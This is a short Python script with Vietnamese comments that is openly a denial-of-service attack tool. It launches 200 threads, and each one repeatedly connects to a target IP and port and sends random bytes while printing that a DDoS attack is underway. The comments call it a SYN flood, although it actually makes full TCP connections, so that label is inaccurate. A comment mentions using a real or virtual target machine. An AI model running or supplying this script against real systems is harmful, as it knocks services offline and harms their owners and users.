import socket
import threading
import random

# Thông tin mục tiêu (thay IP mục tiêu bằng địa chỉ máy thật hoặc máy ảo khác)
TARGET_IP = "192.168.1.20"  # IP mục tiêu
TARGET_PORT = 5000             # Cổng mục tiêu (80 cho HTTP, 5000 cho Flask)

# Hàm gửi gói tin SYN giả
def syn_flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((TARGET_IP, TARGET_PORT))
            sock.sendto(random._urandom(1024), (TARGET_IP, TARGET_PORT))
            sock.close()
        except Exception:
            pass

# Khởi chạy nhiều luồng tấn công
for i in range(200):  # Số lượng luồng, tăng để tăng tải
    thread = threading.Thread(target=syn_flood)
    thread.start()

print("Tấn công DDoS đang thực hiện...")
